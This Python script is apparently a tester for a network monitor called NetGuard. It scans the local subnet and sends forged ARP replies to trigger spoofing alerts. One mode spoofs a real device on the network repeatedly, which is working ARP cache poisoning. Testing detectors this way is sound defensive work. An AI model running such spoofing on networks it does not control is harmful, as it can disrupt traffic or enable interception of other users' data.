import sys
import time
import socket
import threading
try:
    from scapy.all import ARP, Ether, srp, sendp, get_if_list, get_if_addr, get_if_hwaddr, conf
except ImportError:
    print('[ERROR] Scapy not found. Install it with:')
    print('        pip install scapy')
    sys.exit(1)
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
conf.verb = 0

def get_windows_interfaces():
    results = []
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip and ip != '0.0.0.0' and (not ip.startswith('169.254')):
                results.append((iface, ip))
        except Exception:
            pass
    return results

def friendly_name(raw, ip):
    n = raw.lower()
    if any((x in n for x in ('wi-fi', 'wlan', 'wireless', 'wifi'))):
        return f'Wi-Fi  [{raw}]  ({ip})'
    if any((x in n for x in ('ethernet', 'eth', 'local area'))):
        return f'Ethernet  [{raw}]  ({ip})'
    if 'loopback' in n or raw == 'lo':
        return f'Loopback  [{raw}]  ({ip})'
    if any((x in n for x in ('vmnet', 'vbox', 'virtual'))):
        return f'Virtual Adapter  [{raw}]  ({ip})'
    return f'Network Adapter  [{raw}]  ({ip})'

def get_subnet(ip):
    parts = ip.split('.')
    return f'{parts[0]}.{parts[1]}.{parts[2]}.0/24'

def scan_network(iface, subnet):
    print(f'\n  [*] Scanning {subnet} for live devices...')
    try:
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=subnet), iface=iface, timeout=3, verbose=False)
        devices = []
        for sent, received in ans:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
        return devices
    except Exception as e:
        print(f'  [!] Scan failed: {e}')
        return []

def send_arp_reply(iface, src_ip, src_mac, dst_ip='255.255.255.255'):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dst_ip)
    sendp(pkt, iface=iface, verbose=False)

def pick_interface():
    ifaces = get_windows_interfaces()
    if not ifaces:
        print('[ERROR] No network interfaces found.')
        sys.exit(1)
    print('\n  Available Network Interfaces:')
    print('  ' + '─' * 50)
    for i, (raw, ip) in enumerate(ifaces, 1):
        print(f'  [{i}] {friendly_name(raw, ip)}')
    print('  ' + '─' * 50)
    while True:
        try:
            choice = int(input('\n  Choose interface number: '))
            if 1 <= choice <= len(ifaces):
                raw, ip = ifaces[choice - 1]
                print(f'\n  ✓ Selected: {friendly_name(raw, ip)}')
                return (raw, ip)
        except ValueError:
            pass
        print('  [!] Invalid choice, try again.')

def pick_target(devices, my_ip):
    others = [d for d in devices if d['ip'] != my_ip]
    if not others:
        print('\n  [!] No other devices found on the network.')
        return None
    print('\n  Discovered Devices:')
    print('  ' + '─' * 55)
    print(f'  {'#':<4} {'IP Address':<18} {'MAC Address'}')
    print('  ' + '─' * 55)
    for i, d in enumerate(others, 1):
        tag = ''
        if d['ip'].endswith('.1') or d['ip'].endswith('.254'):
            tag = '  ← likely Router/Gateway'
        print(f'  [{i}] {d['ip']:<18} {d['mac']}{tag}')
    print('  ' + '─' * 55)
    while True:
        try:
            choice = int(input('\n  Pick a device to spoof (its IP will be faked): '))
            if 1 <= choice <= len(others):
                chosen = others[choice - 1]
                print(f'\n  ✓ Will spoof IP: {chosen['ip']}  (real MAC: {chosen['mac']})')
                return chosen
        except ValueError:
            pass
        print('  [!] Invalid choice, try again.')

def mode_quick_test(iface):
    FAKE_IP = '10.99.88.77'
    REAL_MAC = '11:22:33:44:55:66'
    ATTACKER_MAC = 'aa:bb:cc:dd:ee:ff'
    print(f'\n  ┌─────────────────────────────────────────────────────┐\n  │  QUICK TEST — No real devices harmed                │\n  │                                                     │\n  │  Fake IP    : {FAKE_IP:<38}│\n  │  Real MAC   : {REAL_MAC:<38}│\n  │  Fake MAC   : {ATTACKER_MAC:<38}│\n  └─────────────────────────────────────────────────────┘\n    ')
    input('  Press Enter to send Step 1 (teach NetGuard the real MAC)...')
    send_arp_reply(iface, FAKE_IP, REAL_MAC)
    print(f'  ✓ Sent:  {FAKE_IP}  →  {REAL_MAC}  (NetGuard now knows this)')
    print('\n  Waiting 3 seconds before sending the spoof...')
    for i in range(3, 0, -1):
        print(f'     {i}...', end='\r')
        time.sleep(1)
    input('\n  Press Enter to send Step 2 (the spoofed ARP — triggers alert)...')
    send_arp_reply(iface, FAKE_IP, ATTACKER_MAC)
    print(f'  ✓ Sent:  {FAKE_IP}  →  {ATTACKER_MAC}  ← DIFFERENT MAC!')
    print('\n  🚨 Check NetGuard GUI — ARP Alerts tab should fire now!')

def mode_scan_and_spoof(iface, my_ip):
    subnet = get_subnet(my_ip)
    devices = scan_network(iface, subnet)
    if not devices:
        print("  [!] No devices found. Make sure you're on an active network.")
        return
    print(f'  ✓ Found {len(devices)} device(s)')
    target = pick_target(devices, my_ip)
    if not target:
        return
    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception:
        attacker_mac = 'aa:bb:cc:dd:ee:ff'
    print(f"\n  ┌─────────────────────────────────────────────────────┐\n  │  SPOOF PLAN                                         │\n  │                                                     │\n  │  Target IP      : {target['ip']:<34}│\n  │  Legitimate MAC : {target['mac']:<34}│\n  │  Attacker MAC   : {attacker_mac:<34}│\n  │  (your machine's MAC — used as the fake MAC)        │\n  └─────────────────────────────────────────────────────┘\n    ")
    print('  Step 1: Teaching NetGuard the REAL MAC mapping...')
    send_arp_reply(iface, target['ip'], target['mac'])
    print(f'  ✓ Sent real ARP:  {target['ip']} → {target['mac']}')
    print('\n  Waiting 3 seconds...')
    for i in range(3, 0, -1):
        print(f'     {i}...', end='\r')
        time.sleep(1)
    print('\n  Step 2: Sending SPOOFED ARP (different MAC for same IP)...')
    send_arp_reply(iface, target['ip'], attacker_mac)
    print(f'  ✓ Sent fake ARP:  {target['ip']} → {attacker_mac}  ← SPOOFED!')
    print('\n  🚨 Check NetGuard GUI — ARP Alerts tab should fire now!')

def mode_continuous_spoof(iface, my_ip):
    subnet = get_subnet(my_ip)
    devices = scan_network(iface, subnet)
    if not devices:
        print('  [!] No devices found.')
        return
    target = pick_target(devices, my_ip)
    if not target:
        return
    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception:
        attacker_mac = 'aa:bb:cc:dd:ee:ff'
    print(f'\n  [*] Continuous spoof: {target['ip']} with fake MAC {attacker_mac}')
    print('  [*] First sending real MAC so NetGuard learns it...')
    send_arp_reply(iface, target['ip'], target['mac'])
    print(f'  ✓ Real MAC sent: {target['mac']}')
    time.sleep(2)
    print('\n  [*] Starting continuous spoofing — press Ctrl+C to stop\n')
    count = 0
    try:
        while True:
            send_arp_reply(iface, target['ip'], attacker_mac)
            count += 1
            print(f'  [{count}] Spoofed ARP sent → {target['ip']} claims MAC {attacker_mac}')
            time.sleep(2)
    except KeyboardInterrupt:
        print(f'\n\n  [*] Stopped after {count} packets. Network will recover shortly.')

def mode_custom(iface):
    print('\n  Enter custom values (press Enter to use defaults shown in brackets):\n')
    fake_ip = input('  Target IP to spoof  [10.55.66.77]: ').strip() or '10.55.66.77'
    real_mac = input("  'Real' MAC to teach NetGuard first  [11:22:33:44:55:66]: ").strip() or '11:22:33:44:55:66'
    fake_mac = input("  'Fake' MAC to send after (triggers alert)  [aa:bb:cc:dd:ee:ff]: ").strip() or 'aa:bb:cc:dd:ee:ff'
    delay = input('  Delay between step 1 and step 2 in seconds  [3]: ').strip()
    delay = int(delay) if delay.isdigit() else 3
    print(f'\n  Plan:\n    IP      : {fake_ip}\n    Real MAC: {real_mac}  → sent first (NetGuard learns this)\n    Fake MAC: {fake_mac}  → sent after {delay}s (triggers alert)\n    ')
    input('  Press Enter to start...')
    print(f'\n  Sending real ARP: {fake_ip} → {real_mac}')
    send_arp_reply(iface, fake_ip, real_mac)
    print(f'  ✓ Done. Waiting {delay} seconds...')
    time.sleep(delay)
    print(f'\n  Sending fake ARP: {fake_ip} → {fake_mac}')
    send_arp_reply(iface, fake_ip, fake_mac)
    print('  ✓ Done!')
    print('\n  🚨 Check NetGuard GUI — ARP Alerts tab should show an alert!')

def main():
    print('\n╔══════════════════════════════════════════════════════════════╗\n║         NetGuard — ARP Spoof Tester (Windows)               ║\n║                                                              ║\n║  This tool sends fake ARP packets to test that NetGuard      ║\n║  correctly detects and displays ARP spoofing alerts.         ║\n║                                                              ║\n║  ⚠  Run as Administrator for Scapy to work correctly        ║\n║  ⚠  Make sure NetGuard is running and capturing first       ║\n╚══════════════════════════════════════════════════════════════╝\n    ')
    print('  STEP 1 — Select your network interface')
    print('  (Must be the SAME interface selected in NetGuard GUI)')
    iface, my_ip = pick_interface()
    print('\n  STEP 2 — Choose a test mode:\n  ─────────────────────────────────────────────────────────────\n  [1] Quick Test        — Uses made-up IPs/MACs. Safest option.\n                          No real devices on your network involved.\n\n  [2] Scan & Spoof      — Scans your LAN, pick a real device\n                          and spoof it once. NetGuard alerts once.\n\n  [3] Continuous Spoof  — Like #2 but keeps sending every 2s.\n                          Good for sustained/repeated alert testing.\n\n  [4] Custom Values     — Enter your own IP and MACs manually.\n  ─────────────────────────────────────────────────────────────')
    while True:
        choice = input('\n  Enter mode [1/2/3/4]: ').strip()
        if choice in ('1', '2', '3', '4'):
            break
        print('  [!] Please enter 1, 2, 3, or 4.')
    print('\n' + '═' * 62)
    if choice == '1':
        mode_quick_test(iface)
    elif choice == '2':
        mode_scan_and_spoof(iface, my_ip)
    elif choice == '3':
        mode_continuous_spoof(iface, my_ip)
    elif choice == '4':
        mode_custom(iface)
    print('\n' + '═' * 62)
    print('\n  Test complete! Open NetGuard → ARP Alerts tab to see results.')
    print('  Press Enter to exit...')
    input()
if __name__ == '__main__':
    main()